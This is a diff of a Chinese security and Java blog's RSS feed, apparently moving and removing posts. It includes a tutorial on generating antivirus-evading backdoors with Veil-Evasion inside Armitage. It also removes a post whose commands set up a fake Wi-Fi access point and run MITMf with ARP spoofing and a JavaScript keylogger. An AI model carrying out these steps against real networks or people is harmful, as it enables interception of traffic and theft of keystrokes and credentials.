@@ -33,6 +33,38 @@ smbclient //192.168.1.198/test -U administrator 123321
                </item>  
           
             <item>  
+               <title>Veil-Evasion与Armitage的集成操作</title>  
+               <description>&lt;p&gt;&lt;a href=&quot;https://www.veil-framework.com/framework/veil-evasion/&quot;&gt;veil-evasion&lt;/a&gt; 是有名的终端下后门生成工具，其免杀效果表现的非常好。&lt;strong&gt;armitage&lt;/strong&gt; 是 metasploit 的图形化操作界面，本文就两者如何集成进行简单说明。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;kali&lt;/strong&gt; 系统下 &lt;strong&gt;armitage&lt;/strong&gt; 是默认安装的， &lt;strong&gt;veil-evasion&lt;/strong&gt; 是需要独立进行安装的，下载地址 &lt;a href=&quot;https://www.veil-framework.com/framework/veil-evasion/&quot;&gt;https://www.veil-framework.com/framework/veil-evasion&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h1 id=&quot;1-启动-posgresql-数据库&quot;&gt;1. 启动 posgresql 数据库&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;armitage&lt;/strong&gt; 的启动依赖于 &lt;strong&gt;postgresql&lt;/strong&gt; 数据库，与 &lt;strong&gt;metasploit&lt;/strong&gt; 共享信息。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;service postgresql start
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h1 id=&quot;2-打开-armitage-加载-veil-evasion-模块&quot;&gt;2. 打开 armitage 加载 veil-evasion 模块&lt;/h1&gt;
+
+&lt;p&gt;依次点击 &lt;strong&gt;armitage&lt;/strong&gt; 菜单，Armitage - Scripts，点击 Load 按钮定位到 &lt;strong&gt;veil-evasion&lt;/strong&gt; 的安装目录中找到 &lt;strong&gt;armitage&lt;/strong&gt; 的扩展文件 &lt;strong&gt;veil-evasion/tools/cortanaveil_evasion.cna&lt;/strong&gt; 加载，加载完成后就会在 &lt;strong&gt;armitage&lt;/strong&gt; 的菜单中看见 &lt;strong&gt;Veil-Evasion&lt;/strong&gt; 的菜单已经被加载到了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/armitage-veilevasion_1.png&quot; alt=&quot;VeilEvasion与Armitage的集成操作&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;3-测试生成-payload&quot;&gt;3. 测试生成 payload&lt;/h1&gt;
+
+&lt;p&gt;点击 &lt;strong&gt;armitage&lt;/strong&gt; 上的 &lt;strong&gt;Veil-Evasion&lt;/strong&gt; 菜单，首次运行会提示输入完整的 &lt;strong&gt;veil-evasion&lt;/strong&gt; 安装路径。配置好生成参数，点击 Generate 按钮即可生成后门文件，也可以点击 Use Listener 按钮开启对后门的监听。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/armitage-veilevasion_2.png&quot; alt=&quot;VeilEvasion与Armitage的集成操作&quot; /&gt;&lt;/p&gt;
+
+</description>  
+               <pubDate>Tue, 01 Nov 2016 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/11/veilevasion-and-armitage/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/11/veilevasion-and-armitage/</guid>  
+               </item>  
+          
+            <item>  
                <title>服务器上的iptables防火墙应该如何配置才能更安全</title>  
                <description>&lt;p&gt;新入网的服务器在不做任何配置的情况下将会出现很多安全问题。端口肆意暴露、来源请求不明，恶意的数据包源源不断的流入服务器中。&lt;/p&gt;
 
@@ -149,128 +181,66 @@ iptables -A OUTPUT -p tcp --sport 443 -j ACCEPT
                </item>  
           
             <item>  
-               <title>Veil-Evasion与Armitage的集成操作</title>  
-               <description>&lt;p&gt;&lt;a href=&quot;https://www.veil-framework.com/framework/veil-evasion/&quot;&gt;veil-evasion&lt;/a&gt; 是有名的终端下后门生成工具，其免杀效果表现的非常好。&lt;strong&gt;armitage&lt;/strong&gt; 是 metasploit 的图形化操作界面，本文就两者如何集成进行简单说明。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;kali&lt;/strong&gt; 系统下 &lt;strong&gt;armitage&lt;/strong&gt; 是默认安装的， &lt;strong&gt;veil-evasion&lt;/strong&gt; 是需要独立进行安装的，下载地址 &lt;a href=&quot;https://www.veil-framework.com/framework/veil-evasion/&quot;&gt;https://www.veil-framework.com/framework/veil-evasion&lt;/a&gt;。&lt;/p&gt;
-
-&lt;h1 id=&quot;1-启动-posgresql-数据库&quot;&gt;1. 启动 posgresql 数据库&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;armitage&lt;/strong&gt; 的启动依赖于 &lt;strong&gt;postgresql&lt;/strong&gt; 数据库，与 &lt;strong&gt;metasploit&lt;/strong&gt; 共享信息。&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;service postgresql start
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h1 id=&quot;2-打开-armitage-加载-veil-evasion-模块&quot;&gt;2. 打开 armitage 加载 veil-evasion 模块&lt;/h1&gt;
-
-&lt;p&gt;依次点击 &lt;strong&gt;armitage&lt;/strong&gt; 菜单，Armitage - Scripts，点击 Load 按钮定位到 &lt;strong&gt;veil-evasion&lt;/strong&gt; 的安装目录中找到 &lt;strong&gt;armitage&lt;/strong&gt; 的扩展文件 &lt;strong&gt;veil-evasion/tools/cortanaveil_evasion.cna&lt;/strong&gt; 加载，加载完成后就会在 &lt;strong&gt;armitage&lt;/strong&gt; 的菜单中看见 &lt;strong&gt;Veil-Evasion&lt;/strong&gt; 的菜单已经被加载到了。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/armitage-veilevasion_1.png&quot; alt=&quot;VeilEvasion与Armitage的集成操作&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;3-测试生成-payload&quot;&gt;3. 测试生成 payload&lt;/h1&gt;
-
-&lt;p&gt;点击 &lt;strong&gt;armitage&lt;/strong&gt; 上的 &lt;strong&gt;Veil-Evasion&lt;/strong&gt; 菜单，首次运行会提示输入完整的 &lt;strong&gt;veil-evasion&lt;/strong&gt; 安装路径。配置好生成参数，点击 Generate 按钮即可生成后门文件，也可以点击 Use Listener 按钮开启对后门的监听。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/armitage-veilevasion_2.png&quot; alt=&quot;VeilEvasion与Armitage的集成操作&quot; /&gt;&lt;/p&gt;
-
-</description>  
-               <pubDate>Tue, 02 Aug 2016 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2016/08/veilevasion-and-armitage/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2016/08/veilevasion-and-armitage/</guid>  
-               </item>  
-          
-            <item>  
-               <title>linux上ssh服务安全策略的配置方法</title>  
+               <title>maven集成ant错误optional.ReplaceRegExp was not found</title>  
                <description>
 </description>  
-               <pubDate>Sun, 17 Jul 2016 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2016/07/ssh-security-policy/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2016/07/ssh-security-policy/</guid>  
+               <pubDate>Sat, 10 Sep 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/09/maven-err-replaceregexp/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/09/maven-err-replaceregexp/</guid>  
                </item>  
           
             <item>  
-               <title>使用denyhosts阻止服务被暴力破解</title>  
+               <title>jdk1.8 高效stream流的遍历、聚合示例代码</title>  
                <description>
 </description>  
-               <pubDate>Wed, 13 Jul 2016 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2016/07/use-denyhosts-brute/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2016/07/use-denyhosts-brute/</guid>  
+               <pubDate>Thu, 08 Sep 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/09/jdk18-stream-demo/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/09/jdk18-stream-demo/</guid>  
                </item>  
           
             <item>  
-               <title>在kali中创建伪装AP热点</title>  
-               <description>&lt;h2 id=&quot;1必须工具&quot;&gt;1.必须工具&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Aircrack-ng&lt;/li&gt;
-  &lt;li&gt;Dnsmasq&lt;/li&gt;
-  &lt;li&gt;Wireless Adapter&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;Aircrack-ng&lt;/strong&gt;：Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a，802.11b，802.11g的数据。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Dnsmasq&lt;/strong&gt;：DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Wireless Adapter&lt;/strong&gt;：无线网卡，伪装AP热点无线一个无线网卡，建议使用外置的无线网卡。&lt;/p&gt;
-
-&lt;h2 id=&quot;2查看无线网卡并启动监听&quot;&gt;2.查看无线网卡并启动监听&lt;/h2&gt;
-&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;airmon-ng&lt;/code&gt;命令查看当前可用的无线网卡信息，如wlan0
-使用&lt;code class=&quot;highlighter-rouge&quot;&gt;airmon-ng start [网卡名称]&lt;/code&gt;启动无线网卡为监听模式，得到wlan0mon&lt;/p&gt;
-
-&lt;h2 id=&quot;3创建无线ap热点&quot;&gt;3.创建无线AP热点&lt;/h2&gt;
-&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;airbase-ng -e [AP_NAME] -c [channel] wlan0mon&lt;/code&gt;创建无线AP热点，如：&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airbase-ng -e FreeWifi -c 6 wlan0mon
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;此时可以扫描到创建的无线热点，但是不能连接去。&lt;/p&gt;
-
-&lt;h2 id=&quot;4创建虚拟网卡及网关&quot;&gt;4.创建虚拟网卡及网关&lt;/h2&gt;
-&lt;p&gt;新打开一个终端，执行以下命令创建虚拟网卡及其路由配置&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig at0 10.0.0.1/24 up
-ifconfig at0 mtu 1400
-route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;5编辑dnsmasq配置并启动&quot;&gt;5.编辑Dnsmasq配置并启动&lt;/h2&gt;
-&lt;p&gt;编辑 &lt;strong&gt;dnsmasq&lt;/strong&gt; 配置文件&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/dnsmasq.conf&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;at0
-dhcp-range&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.10,10.0.0.250,12h
-dhcp-option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3,10.0.0.1
-dhcp-option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6,10.0.0.1
-&lt;span class=&quot;nv&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8.8.8.8
-log-dhcp
-log-queries
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;启动 &lt;strong&gt;dnsmasq&lt;/strong&gt; 服务&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsmasq -C /etc/dnsmasq.conf -d
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;6开启ip转发并设置iptables转发规则&quot;&gt;6.开启IP转发并设置IPTables转发规则&lt;/h2&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -flush
-&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &amp;gt; /proc/sys/net/ipv4/ip_forward
-
-iptables -P FORWARD ACCEPT
-iptables -append FORWARD -in-interface at0 ACCEPT
-
--- iptables -table -nat -append POSTROUTING -out-interface eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;后续可以做什么&quot;&gt;后续可以做什么？&lt;/h2&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -t nat -A PREROUTING -p tcp -destination 80 -j REDIRECT -to-port 10000
-
-# MITMF
-mitmf -i at0 --spoof --arp -gateway 10.0.0.1 --jskeylogger --hsts
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+               <title>mongodb异常Too many threads are already waiting for a connection</title>  
+               <description>
 </description>  
-               <pubDate>Mon, 19 Oct 2015 04:53:00 +0800</pubDate>  
-               <link>http://localhost:4000/2015/10/create-fake-ap-in-kali/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2015/10/create-fake-ap-in-kali/</guid>  
+               <pubDate>Wed, 07 Sep 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/09/mongodb-too-many-threads/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/09/mongodb-too-many-threads/</guid>  
+               </item>  
+          
+            <item>  
+               <title>solr-suggest检索建议配置说明</title>  
+               <description>
+</description>  
+               <pubDate>Sun, 14 Aug 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/08/solr-suggest/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/08/solr-suggest/</guid>  
+               </item>  
+          
+            <item>  
+               <title>solr-master-slave主从模式的配置实现</title>  
+               <description>
+</description>  
+               <pubDate>Sat, 06 Aug 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/08/solr-master-slave/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/08/solr-master-slave/</guid>  
+               </item>  
+          
+            <item>  
+               <title>solr-索引迁移备份与恢复的配置与操作</title>  
+               <description>
+</description>  
+               <pubDate>Fri, 05 Aug 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/08/solr-backup-restore/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/08/solr-backup-restore/</guid>  
+               </item>  
+          
+            <item>  
+               <title>solr-使用uuid类型自动生成主键id</title>  
+               <description>
+</description>  
+               <pubDate>Thu, 04 Aug 2016 12:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2016/08/solr-uuid-geneate/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2016/08/solr-uuid-geneate/</guid>  
                </item>  
           
     </channel>  
